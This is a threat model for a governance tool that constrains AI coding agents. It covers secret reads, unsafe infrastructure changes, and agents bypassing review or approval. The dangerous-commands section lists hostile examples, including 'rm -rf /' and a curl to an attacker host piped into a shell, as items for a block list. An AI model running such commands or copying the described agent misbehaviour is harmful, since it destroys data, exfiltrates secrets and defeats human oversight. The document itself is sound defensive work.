# TerraGuard AgentShield Threat Model

This document outlines the security threats TerraGuard AgentShield is designed to address, and the controls implemented to mitigate them.

## Scope

- AI coding agents: Claude Code, GitHub Copilot, Codex, Cursor, Duo, and similar
- Regulated environments: banking, PCI, healthcare, financial services
- Development workstations and CI/CD pipelines

## Threat model

### 1. Secret exposure via file access

**Threat**: AI agent reads `.env`, `terraform.tfvars`, credentials files, or API keys.

**Impact**: Secrets leak to model context or external APIs.

**Mitigation**:
- `filesystem.block_read` policy prevents agent from reading sensitive files
- Session audit logs all file access attempts
- GitHub PR attestation surfaces blocked access

---

### 2. Unsafe infrastructure changes

**Threat**: AI agent writes destructive or insecure IaC changes without approval.

Examples:
- Public S3 bucket without encryption
- Overly permissive security group
- Removal of MFA enforcement
- Deletion of backups or disaster recovery resources

**Impact**: Infrastructure misconfiguration, data exposure, compliance violations.

**Mitigation**:
- `filesystem.require_approval_write` gates sensitive IaC files
- `commands.block` prevents `terraform apply`, `kubectl delete`, etc.
- Audit evidence generated before Git commit
- Human review required before merge

---

### 3. Direct Git commits and pushes

**Threat**: AI agent bypasses review by pushing directly to protected branches.

**Impact**: Unapproved code reaches production without review.

**Mitigation**:
- `git.block_direct_push_to_protected_branch` enforces PR-only flow
- `git.require_human_reviewer` prevents AI-only approvals
- PR attestation comment surfaces governance decisions

---

### 4. Dangerous shell command execution

**Threat**: AI agent executes dangerous commands (destructive, exfiltration, privilege escalation).

Examples:
- `rm -rf /` or `git push --force`
- `curl https://attacker.com/exfil | sh`
- `aws iam create-access-key`
- `kubectl exec ... -- /bin/sh`

**Impact**: Data loss, privilege escalation, credential compromise.

**Mitigation**:
- `commands.block` prevents known-dangerous patterns
- `commands.require_approval` gates unfamiliar commands
- Session audit logs all executed commands
- Webhook/SIEM export is planned for enterprise evidence workflows

---

### 5. MCP tool sprawl

**Threat**: AI agent connects to unknown or malicious MCP servers.

**Impact**: Agent capability expansion without governance; tool-based data exfiltration.

**Mitigation**:
- `mcp.allowlist_enabled` restricts to approved tools
- `mcp.blocked_servers` explicitly forbids risky tools
- MCP server risk scoring in policy packs

---

### 6. Audit gap / lack of evidence

**Threat**: No immutable record of AI-assisted changes.

**Impact**: Incident response, forensics, and compliance audits are impossible.

**Mitigation**:
- Session audit JSON generated automatically
- GitHub PR attestation comment surfaces decisions
- SIEM/GRC export is planned as a future evidence channel
- Audit trail is immutable and timestamped

---

### 7. Identity spoofing

**Threat**: AI changes are attributed to human developer.

**Impact**: Accountability gap; audit trails are unclear.

**Mitigation**:
- Agent identity captured in session metadata
- AI changes marked distinctly in commit history (via PR attestation)
- GitHub PR author reflects human developer; attestation identifies agent

---

### 8. Approval bypass

**Threat**: AI agent social-engineers approval or skips review.

**Impact**: Risky code reaches production.

**Mitigation**:
- `git.require_human_reviewer` prevents AI-only approvals
- Approval workflows require explicit human sign-off
- Audit evidence documents which reviews were required

---

## Threat landscape

| Threat | Severity | Likelihood | Control |
| --- | --- | --- | --- |
| Secret exposure | Critical | High | `block_read` policy |
| Unsafe infra changes | Critical | High | `require_approval_write`, `block` commands |
| Direct Git push | High | Medium | `block_direct_push_to_protected_branch` |
| Dangerous shell command | High | Medium | `block` command policy |
| MCP tool sprawl | Medium | Medium | `allowlist_enabled` |
| Audit gap | High | High | Session audit, PR attestation |
| Identity spoofing | Medium | Low | Session metadata, PR comment |
| Approval bypass | Medium | Low | `require_human_reviewer` |

---

## Defense-in-depth

TerraGuard AgentShield implements a defense-in-depth strategy:

1. **Configuration layer**: Policy packs define what is allowed/blocked
2. **Runtime layer**: Guards intercept file access, commands, Git actions
3. **Audit layer**: Session audit records governed decisions
4. **Evidence layer**: PR attestation and webhook export provide proof
5. **Review layer**: Human approval gates high-risk changes

---

## Out-of-scope threats

The following are NOT addressed by TerraGuard AgentShield:

- **Network-level attacks**: Assume secure, authenticated connections
- **Supply chain attacks**: Assume trusted AI model vendors
- **Post-compromise forensics**: Assume secure audit storage
- **User training/social engineering**: Depends on organizational security awareness
- **Malicious human developers**: Assume benign operator intent

---

## Future enhancements

Planned controls for future versions:

1. **Semantic policy engine**: Intent-based decision making (not just pattern matching)
2. **Policy signing**: Signed policy bundles to prevent tampering
3. **Approval workflow integration**: ServiceNow, Jira, GitHub PR approval API
4. **SIEM/GRC integrations**: Datadog, Splunk, Sentinel, Salesforce
5. **Machine learning**: Anomaly detection on agent behavior patterns
